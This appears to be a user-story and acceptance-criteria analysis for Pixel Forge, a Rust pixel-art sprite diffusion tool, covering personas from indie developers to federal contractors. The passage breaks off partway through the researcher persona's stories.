# User Story Analysis — Pixel Forge v0.6.0

**Date:** 2026-05-26  
**Analyst:** Claude Sonnet 4.6  
**Method:** Full codebase read (39 source files, govdocs, backlog, proof-of-artifacts, threat model, all Cargo.tomls, memory files, neighboring repo manifests)

---

## What This Product Actually Does

Pixel Forge is a local-first, Rust-native diffusion model system for generating 32×32 pixel art sprites. It ships three model tiers — Cinder (1.09M params, 4.2MB), Quench (5.83M params, 22MB), Anvil (16.9M params, 64MB) — trained on ~20K balanced tiles across 68 sprite classes. It runs on Metal (Apple), CUDA (NVIDIA), Vulkan via any-gpu (AMD/Intel), CPU, WASM (WebGPU), and Android. It ships an egui GUI, a 39-command CLI, a JSON plugin protocol for kova integration, a 4-node SSH cluster distribution system, Ed25519 Proof-of-Authorship signing, BLAKE3 model integrity (NanoSign), and eleven federal compliance documents baked into the binary.

---

## Persona Catalog

| ID | Persona | Primary Entry Point | Tech Level |
|----|---------|---------------------|------------|
| P1 | **Finn** — Indie Game Developer | CLI (`generate`, `tiered`, `anvil`) | Intermediate |
| P2 | **Michael** — IRONHIVE Cluster Admin | CLI (`train-fleet`, `cluster-*`, `train-silo`) | Expert |
| P3 | **Kai** — Kova Plugin Consumer | Plugin protocol (`plugin --loop`) | Advanced |
| P4 | **Commander Walsh** — Federal Defense Contractor | CLI + `govdocs` subcommand | Intermediate |
| P5 | **Dr. Reyes** — ML Researcher | CLI training flags, source code | Expert |
| P6 | **Priya** — Android/Mobile Developer | `android/` crate, WASM crate | Advanced |
| P7 | **Elena** — Security & IP Auditor | PoA packets, NanoSign, govdocs | Expert (security) |
| P8 | **Sam** — Creative Pixel Artist | egui GUI, swipe interface | Beginner |

---

## P1 — Finn, Indie Game Developer

**Context:** Solo developer building a 2D RPG in Godot. Needs 200+ sprites across character, weapon, enemy, and terrain classes. Budget is zero. Has Rust installed, can read error messages, does not want to train a model.

---

### US-P1-01 — Generate sprites for a class without training first

**Story:** As an indie dev, I want to run `pixel-forge generate character --count 8 --palette stardew` against a pre-trained model and get 8 PNG sprites, so that I can populate my game's roster without a 42-hour training run.

**Acceptance Criteria:**
- **Given** a valid `pixel-forge-cinder.safetensors` exists in the current directory, **When** `generate character --count 8 --palette stardew` is run, **Then** 8 valid 32×32 RGBA PNGs are saved and the process exits 0.
- **Given** the model file is absent, **When** the command runs, **Then** it exits with code 1 and prints: `"model not found: pixel-forge-cinder.safetensors\n\nTo train: pixel-forge train --data data_v3_32\nOr download: <releases URL>"` — no tensor panic.
- **Given** `--count 0` is passed, **When** the command is validated, **Then** it exits 1 with `"count must be at least 1"` before attempting to load the model.

---

### US-P1-02 — Reproducible generation with a seed

**Story:** As an indie dev, I want `pixel-forge generate dragon --seed 42` to produce the same sprite every run, so that I can version-control specific sprites and regenerate them identically after a code change.

**Acceptance Criteria:**
- **Given** the same model, class, and `--seed 42`, **When** the command is run twice on the same machine, **Then** the output PNGs are byte-for-byte identical.
- **Given** `--seed 42` and `--seed 43`, **When** both are run, **Then** the output PNGs differ by at least one pixel.
- **Given** the `cascade` subcommand with `--seed 42`, **When** run twice, **Then** output is identical (BACKLOG #2c: seed must thread through `cascade_sample` in `moe.rs`).

---

### US-P1-03 — Export sprites as individual files, not a grid

**Story:** As an indie dev, I want `pixel-forge generate character --count 8 --output sprites/` to produce `sprites/character_001.png` through `sprites/character_008.png`, so that I can import individual sprites into Godot's FileSystem dock without slicing a grid manually.

**Acceptance Criteria:**
- **Given** `--output sprites/` (trailing slash), **When** generation completes, **Then** 8 individual files exist: `character_001.png` … `character_008.png`.
- **Given** the output directory does not exist, **When** the command runs, **Then** it is created automatically with no error.
- **Given** `--output sprite.png` (no trailing slash, `--count 1`), **When** generation runs, **Then** a single file `sprite.png` is written (current behavior preserved).

---

### US-P1-04 — 4-directional sprite sheet from one command

**Story:** As an indie dev, I want `pixel-forge generate knight --four-dir` to produce front/left/right/back views of the sprite using SDF relighting, so that I can drop a complete walk-cycle starter into Godot's AnimatedSprite2D.

**Acceptance Criteria:**
- **Given** a single 32×32 sprite and `--four-dir`, **When** generation completes, **Then** the output PNG is 128×32 (4 views side-by-side) with visually distinct lighting on each view.
- **Given** `--four-dir --split`, **When** generation completes, **Then** four separate files are saved: `out_front.png`, `out_left.png`, `out_right.png`, `out_back.png` (using `relight.rs` `four_dir_sheet` → split path).
- **Given** `--count 4 --four-dir`, **When** generation completes, **Then** four rows of 4-direction sheets are stacked vertically: output is 128×128.

---

### US-P1-05 — Auto-select best model for the current hardware

**Story:** As an indie dev, I want `pixel-forge auto character --count 4` to detect my GPU (Metal/CUDA/Vulkan/CPU) and pick the highest-quality model that fits in VRAM, so that I always get the best output my machine supports without specifying flags.

**Acceptance Criteria:**
- **Given** a machine with Metal and an Anvil model present, **When** `auto` runs, **Then** Anvil is selected and `"tier: Anvil"` appears in stdout.
- **Given** only `pixel-forge-cinder.safetensors` exists on disk, **When** `auto` runs, **Then** Cinder is selected without error.
- **Given** no model files exist, **When** `auto` runs, **Then** exit code 1 with actionable message (same as US-P1-01 sad path).

---

### US-P1-06 — Tiered pipeline produces visibly sharper output than single-model

**Story:** As an indie dev, I want `pixel-forge tiered warrior --count 4 --palette endesga32` to produce sprites with cleaner silhouettes than `pixel-forge generate warrior`, so that the extra runtime of the silo → PaletteNet → Cinder-detail pipeline is worth it.

**Acceptance Criteria:**
- **Given** a silo model for "warrior" in `models/` and a Cinder-detail model, **When** `tiered warrior` runs, **Then** it completes without error and produces 4 palette-quantized sprites.
- **Given** no silo model for the requested class, **When** `tiered` runs, **Then** it falls back to pure Cinder and logs `"no silo found for <class>, falling back to Cinder"`.
- **Given** `--palette-model models/palette.safetensors`, **When** `tiered` runs, **Then** PaletteNet is invoked (Stage 2) and the palette applied reflects class-appropriate colors rather than the full endesga32 palette uniformly.

---

### US-P1-07 — Inspect all available sprite classes

**Story:** As an indie dev, I want `pixel-forge list-classes` to show all 108 class names grouped by their 10 super-categories, so that I know exactly what vocabulary the model understands before writing a Makefile.

**Acceptance Criteria:**
- **Given** any invocation of `pixel-forge list-classes`, **When** run, **Then** output groups classes under headers like `[0] humanoid:`, `[1] creature:`, etc. (matching `class_cond::super_name()`).
- **Given** the output, **When** any listed class name is passed to `generate`, **Then** no `"unknown class"` error is returned.
- **Given** `list-classes` on a machine with no model files, **When** run, **Then** it still outputs the full list (no model load required — pure `class_cond.rs` lookup).

---

### US-P1-08 — Filter a batch by quality score

**Story:** As an indie dev, I want `pixel-forge judge samples/ --model judge.safetensors` to print each file's score and verdict so that I can pipe output through `grep GOOD` and keep only quality sprites.

**Acceptance Criteria:**
- **Given** a directory of PNGs and a trained judge model, **When** `judge` runs, **Then** each line is `"GOOD 0.823 sprites/char_001.png"` or `"BAD  0.312 sprites/char_002.png"` — consistent format parseable by awk.
- **Given** no judge model file present, **When** `judge` runs, **Then** exit 1 with `"judge model not found: judge.safetensors"` (not a tensor panic).
- **Given** a single PNG path (not a directory), **When** `judge` runs, **Then** it scores that single file.

---

### US-P1-09 — Help text organized by command group

**Story:** As an indie dev, I want `pixel-forge --help` to group the 39 subcommands into labeled sections (Generation / Training / Cluster / Compliance / Utilities) so that I can find `generate` in under 10 seconds without scrolling past `cluster-deploy`.

**Acceptance Criteria:**
- **Given** `pixel-forge --help`, **When** output is printed, **Then** generation commands (`generate`, `anvil`, `cascade`, `auto`, `tiered`, `silo`) appear in a labeled "Generation" block before training commands.
- **Given** `pixel-forge generate --help`, **When** output is printed, **Then** all flags are shown with defaults (current behavior — no regression).
- **Given** a new user sees `--help`, **When** they read the output, **Then** `generate` is the first command in the first content group (highest discoverability).

---

### US-P1-10 — Custom palette import

**Story:** As an indie dev, I want `--palette path/to/game.pal` to accept a hex-per-line palette file, so that generated sprites match my game's specific color palette without being limited to the 7 built-ins.

**Acceptance Criteria:**
- **Given** a `.pal` file with one `#RRGGBB` per line, **When** `--palette path/to/game.pal` is passed, **Then** `palette::load_palette()` parses it and quantizes output to only those colors.
- **Given** a malformed palette file (invalid hex), **When** passed, **Then** exit 1 with `"invalid color '#ZZXXYY' in palette file: path/to/game.pal"`.
- **Given** `pixel-forge palettes`, **When** run, **Then** built-in palettes are still listed; custom palette usage is documented in the output.

---

### US-P1-11 — Quality metrics across a generated batch

**Story:** As an indie dev, I want `pixel-forge quality-check samples/` to report pixel diversity, unique color count, and pairwise similarity so that I can detect mode collapse (all sprites look the same) without visual inspection.

**Acceptance Criteria:**
- **Given** a directory of 16 PNGs, **When** `quality-check` runs, **Then** each image gets a line with: filename, pixel diversity score (0–1), unique colors, brightness mean, edge density.
- **Given** all PNGs are identical, **When** `quality-check` runs, **Then** pairwise similarity is flagged: `"WARNING: high pairwise similarity — possible mode collapse"`.
- **Given** `--format json`, **When** `quality-check` runs, **Then** output is valid JSON suitable for piping to `jq`.

---

### US-P1-12 — Pre-trained model download via setup command

**Story:** As an indie dev, I want `pixel-forge setup` to download and verify a working pre-trained Cinder model so that I can generate sprites immediately without a training run.

**Acceptance Criteria:**
- **Given** no model file present, **When** `pixel-forge setup` is run, **Then** it downloads `pixel-forge-cinder.safetensors` from the releases URL, verifies its NanoSign BLAKE3 signature, and exits 0.
- **Given** the download is interrupted, **When** `setup` is re-run, **Then** the partial file is deleted and download restarts cleanly.
- **Given** a valid model already present, **When** `setup` runs, **Then** it prints `"model present and verified — skipping download"` and exits 0 without re-downloading.

---

### US-P1-13 — Generate PNG with transparent background

**Story:** As an indie dev, I want generated sprites to use RGBA with transparent pixels for the background so that I can overlay them on tile maps in Godot without a masking step.

**Acceptance Criteria:**
- **Given** `generate enemy --count 1`, **When** the PNG is opened, **Then** pixels outside the sprite body have alpha=0.
- **Given** `palette::quantize()` is applied, **When** transparent pixels are present in the input, **Then** they remain transparent in the quantized output (palette quantize does not flood-fill background).
- **Given** `--four-dir` output, **When** the sheet is opened, **Then** background pixels between views are transparent, not black.

---

### US-P1-14 — Fine-tune on custom art style

**Story:** As an indie dev, I want `pixel-forge train --resume pixel-forge-cinder.safetensors --data my_sprites/ --epochs 50 --lr 1e-4` to fine-tune the base model on my game's specific art style so that generated output matches my visual aesthetic.

**Acceptance Criteria:**
- **Given** a valid checkpoint and a custom data directory, **When** `train --resume` runs, **Then** weights are loaded before training begins and the first epoch loss is lower than cold-start training on the same data.
- **Given** the resume checkpoint has a `normalize.json` sidecar, **When** training begins, **Then** z-score normalization uses the sidecar stats, not recomputed stats.
- **Given** the resume checkpoint lacks a sidecar, **When** `train --resume` runs, **Then** exit 1 with `"checkpoint requires normalize.json sidecar — see normalize-stats command"` rather than a shape mismatch panic.

---

### US-P1-15 — Scene / tile map generation

**Story:** As an indie dev, I want `pixel-forge scene --biome dungeon --count 4` to produce 4 distinct 8×8 tile-map layouts as 128×128 PNGs using the bootstrap rule engine so that my world generator has varied biome compositions.

**Acceptance Criteria:**
- **Given** `scene --mode bootstrap --biome dungeon --count 4`, **When** run, **Then** 4 PNG files are saved, each a unique arrangement of class slots (verified by pixel difference > 0).
- **Given** `--biome unknown_biome`, **When** run, **Then** a warning `"unknown biome 'unknown_biome', using forest"` is printed and forest layout is generated.
- **Given** `--mode model` without a trained combiner model, **When** run, **Then** exit 1 with `"combiner model not found — use --mode bootstrap or train with train-combiner"`.

---

## P2 — Michael, IRONHIVE Cluster Admin

**Context:** The project author. Operates 4-node IRONHIVE cluster: `lf` (RTX 3070), `bt` (RX 5700 XT, this machine), `gd` (3050 Ti), `st`. Manages distributed training, model sync, kova coordination, and debugging NaN losses across nodes.

---

### US-P2-01 — Configurable cluster paths without recompiling

**Story:** As the cluster admin, I want `PIXEL_FORGE_REMOTE_BIN` and `PIXEL_FORGE_REMOTE_MODELS_DIR` environment variables to override the hardcoded paths in `cluster.rs:31-34`, so that other users can deploy the cluster without their home directory being `/home/mcochran`.

**Acceptance Criteria:**
- **Given** `PIXEL_FORGE_REMOTE_BIN=/opt/bin/pixel-forge`, **When** `cluster-deploy` runs, **Then** it deploys to `/opt/bin/pixel-forge` on each node, not `/home/mcochran/bin/pixel-forge`.
- **Given** neither env var is set, **When** any cluster command runs, **Then** a deprecation warning is logged: `"PIXEL_FORGE_REMOTE_BIN not set; using hardcoded default /home/mcochran/bin/pixel-forge"`.
- **Given** a path containing shell metacharacters is injected via env var, **When** `cluster-deploy` runs, **Then** the path is validated to contain only `[a-zA-Z0-9/_.-]` and rejected if invalid.

---

### US-P2-02 — Fix medium filename default to prevent silent overwrite

**Story:** As the cluster admin, I want `train --medium` to default `--output` to `pixel-forge-quench.safetensors`, not `pixel-forge-cinder.safetensors`, so that a 200-epoch Quench training run does not silently destroy the Cinder checkpoint (BACKLOG #2a).

**Acceptance Criteria:**
- **Given** `train --medium --epochs 200` with no explicit `--output`, **When** training completes, **Then** the checkpoint is written to `pixel-forge-quench.safetensors`.
- **Given** `train --anvil` with no explicit `--output`, **When** training completes, **Then** the checkpoint is written to `pixel-forge-anvil.safetensors`.
- **Given** `train --anvil --bce` with no explicit `--output`, **When** training completes, **Then** the checkpoint is written to `pixel-forge-anvil-sil.safetensors` (existing behavior, verified no regression).

---

### US-P2-03 — Cluster probe with structured JSON output

**Story:** As the cluster admin, I want `pixel-forge cluster-probe --json` to output a JSON object showing each node's name, reachability, tier, VRAM, backend, and estimated throughput so that I can pipe it to `jq` for monitoring scripts.

**Acceptance Criteria:**
- **Given** `cluster-probe --json`, **When** all 4 nodes respond, **Then** the JSON includes `{"nodes": [{"name": "lf", "reachable": true, "tier": "Anvil", "throughput": 0.42, ...}]}`.
- **Given** a node is offline (`SSH_TIMEOUT` exceeded), **When** `cluster-probe --json` runs, **Then** that node appears as `{"name": "bt", "reachable": false, "profile": null}` — no omission, no crash.
- **Given** `jq '.nodes[] | select(.reachable == false) | .name'`, **When** piped from `cluster-probe --json`, **Then** offline node names are emitted cleanly.

---

### US-P2-04 — Batch NanoSign for existing unsigned models

**Story:** As the cluster admin, I want `pixel-forge sign --batch models/` to sign all unsigned `.safetensors` files in a directory so that BACKLOG item #12 is completable in one command.

**Acceptance Criteria:**
- **Given** a directory with 18 silo models, none NanoSigned, **When** `sign --batch models/` runs, **Then** all 18 files are signed and `"signed 18 files, 0 already signed, 0 errors"` is printed.
- **Given** some files already signed, **When** `sign --batch` runs, **Then** signed files are skipped: `"skipped (already signed): models/warrior.safetensors"`.
- **Given** a file fails verification after signing (filesystem error), **When** `sign --batch` runs, **Then** that file is reported as an error and the command exits non-zero.

---

### US-P2-05 — Fleet training with dry-run preview

**Story:** As the cluster admin, I want `pixel-forge train-fleet --data data_v3_32 --epochs 200 --dry-run` to print the exact command dispatched to each node without starting training, so that I can verify the workload assignment before committing 42 hours.

**Acceptance Criteria:**
- **Given** `train-fleet --dry-run`, **When** run, **Then** output shows each node's assigned tier and the exact SSH command that would run: `"lf: pixel-forge train --anvil --epochs 200 ..."`.
- **Given** `--nodes lf,gd`, **When** `train-fleet --dry-run` runs, **Then** only `lf` and `gd` appear in the dry-run output; `bt` and `st` are excluded.
- **Given** a node is offline during dry-run, **When** `--dry-run` runs, **Then** that node's assignment is still printed with a warning: `"gd (offline): would assign Cinder if reachable"`.

---

### US-P2-06 — Resume training validates NanoSign before loading

**Story:** As the cluster admin, I want `train --resume pixel-forge-anvil.safetensors` to verify the NanoSign BLAKE3 signature before loading weights, so that a corrupted or tampered checkpoint is rejected with a clear error rather than producing garbage training.

**Acceptance Criteria:**
- **Given** a valid signed checkpoint, **When** `train --resume` runs, **Then** `"verified: pixel-forge-anvil.safetensors"` is logged and training proceeds.
- **Given** a tampered checkpoint (any byte modified), **When** `train --resume` runs, **Then** exit 1 with `"NanoSign tamper detected: pixel-forge-anvil.safetensors — aborting"`.
- **Given** an unsigned checkpoint, **When** `train --resume` runs, **Then** a warning is logged but training proceeds (backward compat); if `--strict-sign` flag is set, exit 1.

---

### US-P2-07 — Training log in machine-parseable format

**Story:** As the cluster admin, I want training to write a structured loss log to `{output}.log.json` so that I can monitor all 4 nodes' loss curves from one script without screen-scraping SSH sessions.

**Acceptance Criteria:**
- **Given** a training run with `--output pixel-forge-anvil.safetensors`, **When** training begins, **Then** `pixel-forge-anvil.safetensors.log.json` is created with an array of `{"epoch": N, "loss": F, "lr": F, "elapsed_s": N}` objects appended after each epoch.
- **Given** training is interrupted at epoch 50, **When** `cat pixel-forge-anvil.safetensors.log.json`, **Then** 50 entries are present and the JSON is valid (no partial write corruption).
- **Given** `jq '.[] | select(.epoch == 100) | .loss'`, **When** piped from the log file, **Then** the epoch 100 loss is emitted as a bare float.

---

### US-P2-08 — Cluster-sync verifies NanoSign after rsync

**Story:** As the cluster admin, I want `pixel-forge cluster-sync --verify` to verify the NanoSign hash of each model file on the destination node after sync, so that silent rsync corruption is detected before training uses a broken model.

**Acceptance Criteria:**
- **Given** all models sync successfully, **When** `cluster-sync --verify` runs, **Then** each destination file is verified: `"lf: pixel-forge-anvil.safetensors — OK"`.
- **Given** one file is corrupted in transit, **When** verification runs on the destination, **Then** that file is flagged: `"lf: pixel-forge-cinder.safetensors — TAMPERED — retrying sync"` and the file is re-synced once.
- **Given** `--verify` is omitted, **When** `cluster-sync` runs, **Then** sync proceeds without post-verification (current behavior preserved — no regression).

---

### US-P2-09 — Restore skeleton seeding for hybrid conditioning

**Story:** As the cluster admin, I want `pixel-forge skeletons --data data_v3_32` to compute per-class skeleton images keyed by `(super_id, class_name)` so that the warm-start quality improvement (BACKLOG #1) is available with the hybrid conditioning system.

**Acceptance Criteria:**
- **Given** `skeletons --data data_v3_32`, **When** run, **Then** `skeletons_v2.safetensors` is written with keys like `"humanoid/character"` (not legacy integer IDs).
- **Given** `skeletons_v2.safetensors` is present, **When** `generate character --count 4` runs, **Then** generation uses the skeleton warm-start (70% skeleton + 30% noise), logged as `"using skeleton: humanoid/character"`.
- **Given** no skeleton file present, **When** `generate` runs, **Then** pure noise is used without error (graceful fallback, current behavior).

---

### US-P2-10 — GPU lock compatibility with kova

**Story:** As the cluster admin, I want `gpu_lock.rs` to use the same lock file path as kova's c2 gpu scheduler so that pixel-forge training and kova generation jobs on the same node cannot race for the GPU.

**Acceptance Criteria:**
- **Given** kova holds the GPU lock, **When** `pixel-forge train --data data_v3_32 --epochs 1` starts, **Then** it blocks on the lock file until kova releases it, then proceeds.
- **Given** pixel-forge holds the GPU lock during training, **When** kova attempts GPU access, **Then** kova blocks until training completes its current batch.
- **Given** the lock file is stale (process that held it has died), **When** a new pixel-forge train run starts, **Then** the stale lock is detected (via PID check) and cleared with a warning.

---

## P3 — Kai, Kova Plugin Consumer

**Context:** Developer using kova as the primary augment engine. The kova T220 panel discovers and drives pixel-forge via JSON RPC over stdin/stdout. Wants correct palette names, 32×32 output, streaming progress, and first-class tiered pipeline access from within kova.

---

### US-P3-01 — Fix endesga32 palette name in plugin (BACKLOG #2b)

**Story:** As a kova plugin consumer, I want `{"cmd":"generate","args":{"palette":"endesga32"}}` to succeed, so that the kova GUI palette picker works for the most popular indie pixel art palette.

**Acceptance Criteria:**
- **Given** `{"cmd":"generate","args":{"class":"character","palette":"endesga32"}}` is sent to the plugin, **When** handled, **Then** `{"ok":true,"sprites":[...]}` is returned with PNGs quantized to the 32-color endesga32 palette.
- **Given** the old alias `"endesga"` is sent, **When** handled, **Then** `{"ok":false,"error":"unknown palette: endesga. Did you mean endesga32?"}` is returned.
- **Given** the fix is merged, **When** `PALETTE_NAMES` in `plugin.rs:49` is compared to `palette.rs`'s canonical list, **Then** all names match (no divergence possible — derive from one source).

---

### US-P3-02 — Plugin generates 32×32, not 16×16

**Story:** As a kova plugin consumer, I want the `generate` command to return 32×32 sprites, not the hardcoded 16×16 in `plugin.rs:154`, so that kova's gallery displays full-resolution sprites.

**Acceptance Criteria:**
- **Given** `{"cmd":"generate","args":{"class":"character","count":4}}`, **When** handled, **Then** each sprite in `"sprites"` has `"width":32,"height":32`.
- **Given** the PNG bytes in `"png_b64"` are decoded, **When** the image is opened, **Then** it is 32×32 pixels.
- **Given** `device_cap::auto_sample` is called with `img_size=32`, **When** the generation completes, **Then** no shape mismatch errors occur (model trained at 32×32 must match).

---

### US-P3-03 — Seed support in plugin generate

**Story:** As a kova plugin consumer, I want `{"cmd":"generate","args":{"seed":42}}` to produce a deterministic sprite so that kova can implement "Regenerate with same seed" (BACKLOG #2c dependency).

**Acceptance Criteria:**
- **Given** `{"cmd":"generate","args":{"class":"dragon","seed":42}}` sent twice, **When** handled, **Then** both responses contain byte-identical `"png_b64"` values.
- **Given** the response to a generate request, **When** `"seed"` is not provided in args, **Then** a random seed is generated internally and returned in the response as `"used_seed": <u64>`.
- **Given** `"seed": null` in args, **When** handled, **Then** behavior is identical to omitting the seed key.

---

### US-P3-04 — Plugin loop handles persistent connection

**Story:** As a kova plugin consumer, I want `pixel-forge plugin --loop` to handle multiple JSON requests on stdin without restarting the process, so that kova can amortize the model-load time across many generation requests.

**Acceptance Criteria:**
- **Given** `plugin --loop` is started, **When** 10 generate requests are sent sequentially, **Then** all 10 receive valid responses without the process restarting or crashing.
- **Given** a malformed JSON line is sent mid-stream, **When** handled, **Then** `{"ok":false,"error":"bad request: ..."}` is returned and the loop continues (no process death).
- **Given** EOF is sent (kova shuts down), **When** the loop receives it, **Then** the process exits 0 cleanly.

---

### US-P3-05 — Plugin capabilities declares UI selectors

**Story:** As a kova plugin consumer, I want `{"cmd":"capabilities"}` to return palette and class selectors with correct values so that kova's T220 panel builds its UI without any hardcoded knowledge of pixel-forge internals.

**Acceptance Criteria:**
- **Given** `{"cmd":"capabilities"}`, **When** handled, **Then** the response includes a `"ui"` object with `"selectors"` listing all valid `"palette"` values and all base class names.
- **Given** a new palette is added to `palette.rs`, **When** `capabilities` is called, **Then** the new palette appears in the selector list (derived from single source of truth).
- **Given** `{"cmd":"version"}`, **When** handled, **Then** `"version"` matches `env!("CARGO_PKG_VERSION")` — `"0.6.0"` for the current build.

---

### US-P3-06 — Plugin classes grouped by super-category

**Story:** As a kova plugin consumer, I want `{"cmd":"classes"}` to return classes grouped by super-category so that kova can render a hierarchical dropdown (Humanoids / Creatures / Weapons) instead of a flat 108-item list.

**Acceptance Criteria:**
- **Given** `{"cmd":"classes"}`, **When** handled, **Then** response is `{"categories": [{"name":"humanoid","id":0,"classes":["character","elf","knight",...]}, ...]}`.
- **Given** 10 super-categories in `class_cond.rs`, **When** `classes` is called, **Then** exactly 10 category entries are present.
- **Given** an unknown class passed to `generate` via the plugin, **When** handled, **Then** the error message includes a suggestion: `"unknown class 'mage'. Run {"cmd":"classes"} for valid names"`.

---

### US-P3-07 — Plugin reports model availability

**Story:** As a kova plugin consumer, I want `{"cmd":"models"}` to return which model tiers are installed and each model's NanoSign status so that kova's model panel can display integrity indicators.

**Acceptance Criteria:**
- **Given** `{"cmd":"models"}`, **When** handled, **Then** each entry includes `"tier"`, `"file"`, `"exists"`, `"size_bytes"`, `"params"`, and `"signed": true|false|"tampered"`.
- **Given** a tampered model file, **When** `models` is called, **Then** that entry shows `"signed":"tampered"` and a warning is logged server-side.
- **Given** no models are installed, **When** `models` is called, **Then** all entries have `"exists":false` and `ok:true` (not an error — informational response).

---

### US-P3-08 — Plugin progress streaming

**Story:** As a kova plugin consumer, I want the plugin to emit progress updates during generation so that kova can display a progress bar during the 40-step denoising loop.

**Acceptance Criteria:**
- **Given** `{"cmd":"generate","args":{"count":1,"steps":40}}`, **When** generation starts, **Then** intermediate lines `{"progress":0.25,"step":10,"total":40}` are emitted before the final response.
- **Given** kova reads progress lines, **When** the final `{"ok":true,"sprites":[...]}` arrives, **Then** it is distinguishable from progress lines by the presence of `"ok"` key.
- **Given** `--loop` mode with a slow generation, **When** kova reads line-by-line, **Then** no deadlock occurs due to buffering (lines are flushed after each write).

---

## P4 — Commander Walsh, Federal Defense Contractor

**Context:** CAGE 1CQ66 contractor, deploying pixel-forge on an air-gapped SIPR workstation to generate training simulation assets. Requires CMMC L2 evidence, binary provenance, and zero network connections.

---

### US-P4-01 — SBOM output for ATO package

**Story:** As a federal contractor, I want `pixel-forge --sbom` to print a valid SPDX 2.3 bill of materials to stdout so that I can pipe it into my compliance tooling (`grype`, contract management system) without internet access.

**Acceptance Criteria:**
- **Given** `pixel-forge --sbom`, **When** run on any platform, **Then** output begins with `SPDXVersion: SPDX-2.3` and lists all 16+ direct dependencies from `Cargo.toml`.
- **Given** the output is piped to `grype sbom:-`, **When** `grype` parses it, **Then** it processes without format errors (valid SPDX syntax).
- **Given** a new dependency is added to `Cargo.toml`, **When** `--sbom` is run, **Then** the new dependency appears (SBOM is generated from build metadata, not a hardcoded string).

---

### US-P4-02 — CMMC control mapping accessible offline

**Story:** As a federal contractor, I want `pixel-forge govdocs cmmc` to display the CMMC 2.0 Level 2 control mapping with source-code line citations so that a DIBCAC assessor can verify controls without internet access or a Rust development environment.

**Acceptance Criteria:**
- **Given** `pixel-forge govdocs cmmc`, **When** run on an air-gapped machine, **Then** the full `govdocs/CMMC.md` content is printed (baked via `include_str!` in `main.rs:16`).
- **Given** `pixel-forge govdocs` (no argument), **When** run, **Then** an index of all 11 available documents is printed with their names.
- **Given** `pixel-forge govdocs invalid-doc`, **When** run, **Then** exit 1 with `"unknown document: invalid-doc. Available: sbom, security, ssdf, fips, cmmc, ..."`.

---

### US-P4-03 — Zero network connections during operation

**Story:** As a federal contractor, I want pixel-forge to make zero network connections during generation, training, or govdocs output so that it passes `strace -e trace=network` inspection for air-gapped deployment.

**Acceptance Criteria:**
- **Given** `strace -e trace=network pixel-forge generate character --count 1`, **When** run, **Then** no `connect()`, `sendto()`, or `recvfrom()` syscalls appear (excluding loopback).
- **Given** `pixel-forge govdocs sbom`, **When** run, **Then** no network syscalls occur.
- **Given** `pixel-forge --sbom`, **When** run, **Then** the binary reads only local files (model, data directory) and writes only to local paths.

---

### US-P4-04 — Binary runs on RHEL 8 without additional dependencies

**Story:** As a federal contractor, I want the Linux x86_64 release binary to run on RHEL 8 (glibc 2.28) with no additional package installation so that I can deploy it to DoD workstations without admin rights.

**Acceptance Criteria:**
- **Given** a RHEL 8 minimal install with no development packages, **When** `pixel-forge --help` is run, **Then** it executes without dynamic linker errors.
- **Given** the release build profile with `lto=true, strip=true`, **When** `ldd target/release/pixel-forge` is run, **Then** only `libm`, `libc`, `libpthread`, and optionally `libstdc++` appear (no non-standard `.so` deps).
- **Given** a CUDA build, **When** deployed to a machine without CUDA drivers, **Then** it falls back to CPU with a logged message rather than crashing on `libcuda.so` load.

---

### US-P4-05 — PoA packet for signed asset delivery

**Story:** As a federal contractor, I want `pixel-forge forge character --count 8` to produce sprites with embedded Ed25519 Proof-of-Authorship packets so that I can deliver provenance-signed simulation assets to the program office.

**Acceptance Criteria:**
- **Given** `forge character --count 8 --threshold 0.94`, **When** run, **Then** 8 sprites are produced, each accompanied by a 153-byte `GhostPacket` where `packet.verify()` returns `true`.
- **Given** `pixel-forge node-key`, **When** run, **Then** the Ed25519 public key (64 hex chars) is printed, matching the key embedded in all PoA packets from this machine.
- **Given** a GhostPacket's `artifact_hash` field, **When** SHA-256 is computed over the sprite's raw 32×32×3 pixel data, **Then** it matches `packet.artifact_hash` (per `poa.rs:114`).

---

### US-P4-06 — Reproducible build for binary verification

**Story:** As a federal contractor, I want two builds from the same `Cargo.lock` and source to produce identical binaries so that I can verify the deployment binary against a vendor-published SHA-256 manifest.

**Acceptance Criteria:**
- **Given** `cargo build --release --no-default-features` run twice from a clean state with the same toolchain version, **When** both binaries are produced, **Then** `sha256sum` outputs the same hash for both.
- **Given** a published SHA-256 manifest for the release binary, **When** `sha256sum target/release/pixel-forge` is run on a fresh build, **Then** the hash matches the manifest entry.
- **Given** `--no-default-features` (CPU-only build), **When** the binary runs `pixel-forge govdocs sbom`, **Then** the SBOM omits `hf-hub`, `tokenizers`, and `candle-transformers` (optional feature exclusion).

---

### US-P4-07 — Ed25519 key stored with restricted permissions

**Story:** As a federal contractor, I want `~/.pixel-forge/node.key` to be created with `0o600` permissions and verified at startup so that the signing key satisfies CMMC AC.L1-3.1.1 least-privilege requirements (per `poa.rs:159`).

**Acceptance Criteria:**
- **Given** `pixel-forge forge character --count 1` on a new machine, **When** `~/.pixel-forge/node.key` is created, **Then** `stat ~/.pixel-forge/node.key` shows permissions `0600`.
- **Given** `node.key` exists with `0644` permissions (from a `cp` or `scp` operation), **When** `pixel-forge forge` is run, **Then** a warning is logged: `"node.key permissions too open (0644) — set to 0600 for security"` and permissions are corrected automatically.
- **Given** the key file is deleted, **When** `pixel-forge node-key` is run, **Then** a new keypair is generated and the new public key is printed.

---

## P5 — Dr. Reyes, ML Researcher

**Context:** PhD candidate studying conditional diffusion for low-resolution outputs. Has A100 access, reads Karras 2022 paper-level code, wants to extend the EDM architecture, run ablations, and produce reproducible results for publication.

---

### US-P5-01 — Expose min-SNR gamma as a CLI flag

**Story:** As an ML researcher, I want `--min-snr-gamma <f64>` on the `train` command so that I can sweep γ values (5, 13, 20) and measure convergence without modifying source code.

**Acceptance Criteria:**
- **Given** `train --min-snr-gamma 13 --data data_v3_32 --epochs 10`, **When** training runs, **Then** the γ=13 weighting is applied per `precond.rs` and `"min_snr_gamma=13"` is logged.
- **Given** `train --min-snr-gamma 5` with `σ_data=0.4007`, **When** training runs, **Then** a warning is logged: `"min_snr_gamma=5 is a no-op for σ_data=0.4007 (1/σ²=6.23 > 5); recommend γ≥13"` (documents the known bug from BACKLOG, per `PROOF_OF_ARTIFACTS.md:50`).
- **Given** `train` with no `--min-snr-gamma`, **When** training runs, **Then** default is γ=13 (corrected from γ=5 no-op).

---

### US-P5-02 — Structured training log for programmatic analysis

**Story:** As an ML researcher, I want each epoch appended to a JSON log file so that I can plot loss curves and learning rate schedules programmatically.

**Acceptance Criteria:**
